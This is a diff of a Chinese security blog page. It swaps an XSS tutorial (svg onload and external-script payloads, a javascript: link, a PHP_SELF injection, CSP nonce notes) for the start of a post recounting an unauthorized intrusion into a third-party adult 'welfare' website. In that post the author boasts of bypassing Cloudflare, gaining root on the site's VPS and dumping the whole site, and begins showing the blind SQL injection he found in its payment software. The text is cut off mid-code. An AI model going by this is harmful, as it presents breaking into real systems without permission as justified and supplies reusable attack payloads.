@@ -6,25 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://c0der1iu.github.io">
-  <title>XSS跨站脚本攻击探讨总结 | C0d3r1iu&#39;s Blog</title>
+  <title>强行绕开CDN怒怼福利网站 | C0d3r1iu&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="XSS 跨站脚本攻击漏洞 个人整理12整体篇幅比较长，也算是我自己学习道路上的总结。大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~ 一.攻击原理：设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等） 比如网页有一功能：某标签内的value引用一">
-<meta name="keywords" content="XSS 跨站脚本攻击">
+  <meta name="description" content="对某福利网站的渗透测试Author:C0d3r1iu0x00 前言三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。也算是为净化网络做了一点点贡献。 首页图片就不放了，过程中很多图当时都没截，还请大家将就一下 0x01 识破虚幻:对于我来说，渗透的本质是有效信息收集和利用(因为基本混不到最新的0day) 通过浏览器插件Wappalyze">
+<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS跨站脚本攻击探讨总结">
-<meta property="og:url" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/index.html">
+<meta property="og:title" content="强行绕开CDN怒怼福利网站">
+<meta property="og:url" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/index.html">
 <meta property="og:site_name" content="C0d3r1iu&#39;s Blog">
-<meta property="og:description" content="XSS 跨站脚本攻击漏洞 个人整理12整体篇幅比较长，也算是我自己学习道路上的总结。大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~ 一.攻击原理：设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等） 比如网页有一功能：某标签内的value引用一">
-<meta property="og:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/xss.png">
-<meta property="og:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/svg.png">
-<meta property="og:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/csp.png">
-<meta property="og:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/csp3.png">
-<meta property="og:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/csp2.png">
-<meta property="og:updated_time" content="2018-01-26T06:46:07.652Z">
+<meta property="og:description" content="对某福利网站的渗透测试Author:C0d3r1iu0x00 前言三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。也算是为净化网络做了一点点贡献。 首页图片就不放了，过程中很多图当时都没截，还请大家将就一下 0x01 识破虚幻:对于我来说，渗透的本质是有效信息收集和利用(因为基本混不到最新的0day) 通过浏览器插件Wappalyze">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/huanjing.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/inject.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/shujuku.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/cloudflare.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/ipxx.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/ipwhois.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/pass.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/cube.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/vpscp.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/serverinfo.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/baota.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/ziyuan.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/users.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/infomation.png">
+<meta property="og:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/edlm.png">
+<meta property="og:updated_time" content="2018-12-19T04:27:02.541Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS跨站脚本攻击探讨总结">
-<meta name="twitter:description" content="XSS 跨站脚本攻击漏洞 个人整理12整体篇幅比较长，也算是我自己学习道路上的总结。大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~ 一.攻击原理：设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等） 比如网页有一功能：某标签内的value引用一">
-<meta name="twitter:image" content="http://c0der1iu.github.io/2018/01/25/XSS-Explain-1/xss.png">
+<meta name="twitter:title" content="强行绕开CDN怒怼福利网站">
+<meta name="twitter:description" content="对某福利网站的渗透测试Author:C0d3r1iu0x00 前言三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。也算是为净化网络做了一点点贡献。 首页图片就不放了，过程中很多图当时都没截，还请大家将就一下 0x01 识破虚幻:对于我来说，渗透的本质是有效信息收集和利用(因为基本混不到最新的0day) 通过浏览器插件Wappalyze">
+<meta name="twitter:image" content="http://c0der1iu.github.io/2018/10/26/Hack-Record1/huanjing.png">
   
   
     <link rel="icon" href="/faction/head.jpg">
@@ -152,115 +162,94 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-XSS-Explain-1" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Hack-Record1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      XSS跨站脚本攻击探讨总结
+      强行绕开CDN怒怼福利网站
     </h1>
   
 
         
-        <a href="/2018/01/25/XSS-Explain-1/" class="archive-article-date">
-  	<time datetime="2018-01-25T05:29:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-25</time>
+        <a href="/2018/10/26/Hack-Record1/" class="archive-article-date">
+  	<time datetime="2018-10-26T14:09:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-26</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="XSS-跨站脚本攻击漏洞-个人整理"><a href="#XSS-跨站脚本攻击漏洞-个人整理" class="headerlink" title="XSS 跨站脚本攻击漏洞 个人整理"></a>XSS 跨站脚本攻击漏洞 个人整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整体篇幅比较长，也算是我自己学习道路上的总结。</span><br><span class="line">大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~</span><br></pre></td></tr></table></figure>
-<h3 id="一-攻击原理："><a href="#一-攻击原理：" class="headerlink" title="一.攻击原理："></a>一.攻击原理：</h3><p>设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等）</p>
-<p>比如网页有一功能：某标签内的value引用一个用户输入的值，然而用户使用 “ 闭合value后面的赋值，接着后面输入onload=”alert(1) 又与value原本的第二个” 相结合，构造出一段额外的弹窗代码</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">" from_user_input "</span>/&gt;</span><br></pre></td></tr></table></figure>
-<p>当 用户输入” onfocus=”alert(1) 时变成了这样：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">onfocus</span>=<span class="string">"alert(1) "</span>/&gt;</span><br></pre></td></tr></table></figure></p>
-<p>value后面的值被双引号闭合，后面又构造出了一个on事件，从而执行攻击者自定义的操作</p>
-<p>总的来说XSS基本流程是： 攻击者输入-&gt;网页输出-&gt; 受害者打开网页浏览中招</p>
-<p><img src="/2018/01/25/XSS-Explain-1/xss.png" alt=""></p>
-<a id="more"></a>
-<h3 id="二-XSS类型分类："><a href="#二-XSS类型分类：" class="headerlink" title="二.XSS类型分类："></a>二.XSS类型分类：</h3><p>XSS可以大致分为两或三类:</p>
-<h4 id="第一类："><a href="#第一类：" class="headerlink" title="第一类："></a>第一类：</h4><p>如果攻击payload存于url中，受害者需要访问特定携带payload的url才会中招，并且payload并不会入库即不会存储持续触发，则可以称此类型的XSS漏洞为反射型XSS<br>比如网页通过调用当前页面get传入的参数显示到页面中。<br>这类XSS最好防范，危险系数也相对较低，但存在数量较多，挖掘成本低</p>
-<p>大致流程：访问页面进行构造闭合测试，查看源码或者F12使用开发者工具进行修改调试，能弹窗后进行cookie获取测试</p>
-<p>值得一提的是：目前浏览器有自带filter过滤，除火狐浏览器，其他浏览器针对一般的XSS攻击payload已经有了自己的防范机制(放弃加载并警告用户)，为了bypass这一机制，需要进行特殊的编码构造，这又是一门学问。</p>
-<h4 id="第二类："><a href="#第二类：" class="headerlink" title="第二类："></a>第二类：</h4><p>如果攻击payload可以入库，并且长期反应在某一页面中，受害者只要浏览了特定页面就会中招，则称此类型为储存型XSS。<br>这类XSS危害大，挖掘成本较高(需要目标站的提交数据权限)<br>大致流程:<br>通过修改个人资料或提交留言行为进行测试，一般提交一串xss sheet 或者自己觉得好用的payload，当弹框成功后再考虑构造进一步攻击。</p>
-<p>根据构造闭合代码性质不同(html标签or页面JS代码)，还可分为普通XSS和Dom型XSS。</p>
-<p>笔者曾经挖到过CNZZ个人管理页面的DOM储存型XSS，但是属于self-xss，即只有自己能中招的XSS（其他用户访问不到这个页面），如果不能结合CSRF漏洞则比较鸡肋,属于SRC混分行为。</p>
-<h3 id="三-一些经典测试payload："><a href="#三-一些经典测试payload：" class="headerlink" title="三.一些经典测试payload："></a>三.一些经典测试payload：</h3><h5 id="笔者最喜欢用的payload是："><a href="#笔者最喜欢用的payload是：" class="headerlink" title="笔者最喜欢用的payload是："></a>笔者最喜欢用的payload是：</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(1)//</span></span><br></pre></td></tr></table></figure>
-<p>当时拿着这段payload这插插那插插，一天就过去了，玩的不亦乐乎<br>现在想想，这段短小的payload伴随了我测试XSS漏洞的整个时光呢~</p>
-<h5 id="具体引用外部js的代码姿势是"><a href="#具体引用外部js的代码姿势是" class="headerlink" title="具体引用外部js的代码姿势是:"></a>具体引用外部js的代码姿势是:</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'<span class="comment">//</span></span><br></pre></td></tr></table></figure>
-<p>在火狐浏览器下查看的效果(浏览器解析时会自动加上引号):</p>
-<p><img src="/2018/01/25/XSS-Explain-1/svg.png" alt=""></p>
-<h5 id="a标签伪协议执行"><a href="#a标签伪协议执行" class="headerlink" title="a标签伪协议执行"></a>a标签伪协议执行</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span> &gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h5 id="data引用外域资源"><a href="#data引用外域资源" class="headerlink" title="data引用外域资源"></a>data引用外域资源</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,这里跟着base64之后的js代码"</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>外域获取cookie,据我所知只有火狐才可以了，这里涉及同源策略相关知识。</p>
-<p>具体情况还需要具体分析，一定要记住 灵活构造 才是XSS最核心的东西</p>
-<p>以上是黑盒测试我自己的基本流程</p>
-<p>如果平时代码审计呢？</p>
-<p>在PHP下我还真审计出来不少,基本操作还是那些，说一个记忆比较深刻的吧</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">_SERVER[<span class="string">'PHP_SELF'</span>]</span></span><br></pre></td></tr></table></figure>
-<p>这个PHP超全局变量如果作为输出显示到网页中，会提供当前url，<br>然而不少php环境下开启PATH_INFO，这种功能可以提供路径的形式传参<br>比如Wordpress提供生成静态链接方法，路径是index/article/001，其实这是给index.php传入 article 和 001两个参数，我们可以构造</p>
-<p><code>http://url.cn/index/&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;/xxx/</code></p>
-<p>来作为传入参数，这样显示的url也就包括了这一段payload<br>有趣的是，我在写上面代码的时候，我的markdown编辑器预览界面弹窗了233</p>
-<h3 id="四-谈谈防护："><a href="#四-谈谈防护：" class="headerlink" title="四.谈谈防护："></a>四.谈谈防护：</h3><h5 id="SOP策略（同源策略）"><a href="#SOP策略（同源策略）" class="headerlink" title="SOP策略（同源策略）"></a>SOP策略（同源策略）</h5><p>源是主机，协议，端口名的一个三元组。</p>
-<p>同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。注意：它仅仅是个模型</p>
-<p>给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">EX:</span> <span class="string">http:</span><span class="comment">//a.url.cn/c0d3r1iu.html</span></span><br></pre></td></tr></table></figure></p>
-<hr>
-<p><a href="http://a.url.cn:80/marvel/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/marvel/c0d3r1iu.html</a> 同源<br><a href="http://a.url.cn:80/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/c0d3r1iu.html</a> 同源<br><a href="http://b.a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">http://b.a.url.cn/c0d3r1iu.html</a> 同源 (二级域相同的三级域名)<br><a href="https://a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://a.url.cn/c0d3r1iu.html</a> 不同源<br><a href="http://a.url.cn:88/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:88/c0d3r1iu.html</a> 不同源<br><a href="https://b.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://b.url.cn/c0d3r1iu.html</a> 不同源</p>
-<hr>
-<p>通过这些例子，大概能了解什么是同源了吧<br>同源策略只允许来自于同源的页面共享一些数据，比如cookie<br>如果没有同源策略，那浏览器就太不安全了，我们会面临访问任意网站都能跨域访问将你的社交网站的cookie共享，这将使得攻击者拿到你的网站管理权限如同探囊取物。</p>
-<p>因此：</p>
-<p>同源策略是由Netscape提出的一个著名的安全策略，现在所有支持JavaScript 的浏览器都会使用这个策略，一些网站认为自己设置了CSP（下一节）script:’self’ 就安全了，他们忘记了document.domain是可以修改的！</p>
-<h5 id="CSP策略-内容安全策略"><a href="#CSP策略-内容安全策略" class="headerlink" title="CSP策略(内容安全策略)"></a>CSP策略(内容安全策略)</h5><p>CSP实际就是一个白名单，它通过设置http头的内容，告诉浏览器可以加载哪些外部资源，比如script，iframe的src可以指定哪些来源</p>
-<h6 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h6><p>default-src 指定了下列所有的资源加载有效来源。</p>
-<h6 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h6><p>定义了页面中Javascript的有效来源</p>
-<h6 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h6><p>定义了页面中CSS样式的有效来源</p>
-<h6 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h6><p>定义了页面中图片和图标的有效来源</p>
-<h6 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h6><p>定义了字体加载的有效来源</p>
-<h6 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h6><p>定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p>
-<h6 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h6><p>指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。</p>
-<p>关键字（必须要加单引号）</p>
-<pre><code>&apos;none&apos;
-代表空集；即不匹配任何 URL。
-&apos;self&apos; url
-代表和文档同源（详见上一节），包括相同的 URL 协议和端口号。
-&apos;unsafe-inline&apos;
-允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,不怎么安全（除非有设置nonce）
-&apos;unsafe-eval&apos;
-允许使用 eval() 等通过字符串创建代码的方法。
-![](eval.png)
-&apos;nonce-abc&apos;
-标签内需要设定和上面相符的nonce值才会执行，google团队提出了一个新的思想，那就是随机化nonce,利用几行后端代码就可以指定nonce之后的值为随机生成的值，使得攻击难度剧增。
-不过freebuf上有一篇翻译文章指出，这种情况在服务端开启了缓存的情况下还是可以被攻破：
-[附上链接](http://www.freebuf.com/articles/web/133455.html)
-</code></pre><p>如果后面空格跟上数据：<br>    data:<br>        允许data: URI作为内容来源。<br>    mediastream:<br>        允许mediastream: URI作为内容来源。</p>
-<p>PS:如果要采用多种关键字，直接空格连接就OK</p>
-<hr>
-<p>做些小实验方便理解一些东西：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'none';script-src 'nonce-abc'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"ab"</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">alert(2)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果不加第一行，那么会弹窗1，2<br>但是加了CSP策略，只会弹出2，因为alert(1)所在的script标签nonce不符合策略要求</p>
-<p>接下来通过一个XSS挑战例子说明：</p>
-<p>我们设置如下内容安全策略来限制script加载的地址和iframe加载的地址：</p>
-<p><img src="/2018/01/25/XSS-Explain-1/csp.png" alt=""></p>
-<p>当我们试图在iframe将地址设置成 www.baidu.com 的时候，可以看到不会加载成功</p>
-<p><img src="/2018/01/25/XSS-Explain-1/csp3.png" alt=""></p>
-<p>如果我们换成符合设定CSP规则的，则可以加载成功</p>
-<p><img src="/2018/01/25/XSS-Explain-1/csp2.png" alt=""></p>
-<p>此乃内容安全策略，它限制了在当前网页Dom加载资源的来源</p>
-<p>于是我们可以加载主域名相同的其他有XSS漏洞的站点来攻击这个站点</p>
-<p>在嵌入的子页面执行攻击代码，通过top方法，获取父页面的document.cookie</p>
-<h3 id="五-具体攻击实例-amp-参考文献："><a href="#五-具体攻击实例-amp-参考文献：" class="headerlink" title="五.具体攻击实例&amp;参考文献："></a>五.具体攻击实例&amp;参考文献：</h3><p>根据《网络安全法》，笔者不赘述具体攻击详细分析，可以自行去乌云网镜像网站搜索，学习。</p>
-<p>推荐 “心伤的瘦子经典教程”，在这里向他以及消失的乌云致敬！</p>
-<p>CSP策略部分参考链接：</p>
-<p>Sakura2016简书：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p>
-<p>阿里聚安全：<a href="http://jaq.alibaba.com/community/art/show?articleid=518" target="_blank" rel="noopener">http://jaq.alibaba.com/community/art/show?articleid=518</a></p>
-<p>另附一个挑战赛：</p>
-<p><a href="https://knock.xss.moe/index" target="_blank" rel="noopener">XSS千锤百炼挑战赛</a></p>
-<p>学长推荐的，对于新手练习来说也算很不错了，涉及的知识点挺广的。之前忙于其他事情一直也没有把他打穿，然而学长们早都AK了orz，这几天尽量把它做完吧。。。</p>
-<h3 id="六-后记-amp-防御"><a href="#六-后记-amp-防御" class="headerlink" title="六.后记&amp;防御"></a>六.后记&amp;防御</h3><p>XSS攻防好比灵活的舞蹈，需要天马行空的想象，大家加油！</p>
-<p>我准备把相关防御和绕过的探讨放到下一篇，因为这一篇写的东西有点多，atom眼看就要崩溃了QAQ，下次再见 :p</p>
+        <h1 id="对某福利网站的渗透测试"><a href="#对某福利网站的渗透测试" class="headerlink" title="对某福利网站的渗透测试"></a>对某福利网站的渗透测试</h1><h4 id="Author-C0d3r1iu"><a href="#Author-C0d3r1iu" class="headerlink" title="Author:C0d3r1iu"></a>Author:C0d3r1iu</h4><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>三个月前偶遇一个福利网站,在欣赏网站内容的同时对其进行了检测，最后以root的身份逛了逛他的vps，打包了整站。<br>也算是为净化网络做了一点点贡献。</p>
+<p>首页图片就不放了，过程中很多图当时都没截，还请大家将就一下</p>
+<h2 id="0x01-识破虚幻"><a href="#0x01-识破虚幻" class="headerlink" title="0x01 识破虚幻:"></a>0x01 识破虚幻:</h2><p>对于我来说，渗透的本质是有效信息收集和利用(因为基本混不到最新的0day)</p>
+<p>通过浏览器插件Wappalyzer可以知道:</p>
+<pre><code>主站是用wordpress改的，主要运营模式是通过后台发布资源并且配合插件兜售邀请码
+网站有CDN,还是国外的CloudFlareCDN
+</code></pre><p><img src="/2018/10/26/Hack-Record1/huanjing.png" alt=""></p>
+<p>扫了一遍目录，没发现什么敏感备份，主站几乎无望</p>
+<p>收集子域名，发现:</p>
+<pre><code>pay.xxx.xxx（用于支付购买其邀请码，类似发卡平台）
+ss.xxx.xxx （用于给会员提供ss翻墙???）
+</code></pre><p>其中 pay.xxx.xxx 在网站底部发现是用的EDLM发卡程序</p>
+<p>第一次听说这个程序，去百度搜了一下发现是一个私人写的支付检测并自动发卡的程序，需要在服务器上开启客户端一直监听着支付宝或者微信有无收款信息再配合系统进行发卡确认。</p>
+<p>它的官网貌似也用的和pay这个子站点一样的版本，下载网上流传的免费版审计一波，发现了一处sql盲注</p>
+<p>这个代码写的有点意思，其中特地注释了 “防止sql注入” 差点就把我吓跑了，下面附上自己体会:</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断被设置（被修改）后内容是否为空白</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>['text'] != '')&#123;</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `kms` WHERE `dh` LIKE '"</span>.intval(<span class="variable">$_POST</span>['text']).<span class="string">"';"</span>;<span class="comment">//设置sql语句查询此单号是否已使用过</span></span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">  <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">  <span class="comment">//判断结果是与否</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="comment">//是则执行以下代码</span></span><br><span class="line">    <span class="variable">$_POST</span>['text'] = intval(<span class="variable">$_POST</span>['text']);<span class="comment">//防止sql注入</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `kms` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"';"</span>;<span class="comment">//设置sql语句查询此单号是否已使用过</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">      <span class="variable">$kms</span> .= <span class="variable">$rows</span>['km'].<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `lists` WHERE `spid` LIKE '"</span>.<span class="variable">$row</span>['spid'].<span class="string">"';"</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行sql语句并获取结果</span></span><br><span class="line">    <span class="variable">$sp</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    echo '</span><br><span class="line">      &lt;div <span class="keyword">class</span>=<span class="string">"am-panel am-panel-primary"</span> id=<span class="string">"look"</span>&gt;</span><br><span class="line">          &lt;ul <span class="keyword">class</span>=<span class="string">"tpl-task-list tpl-task-remind"</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;center&gt;&lt;span&gt;Tip:查询成功&lt;/span&gt;&lt;/center&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-info"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-location-arrow"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 名称: &lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$sp</span>['title'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-mixcloud"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 云端单号: &lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span 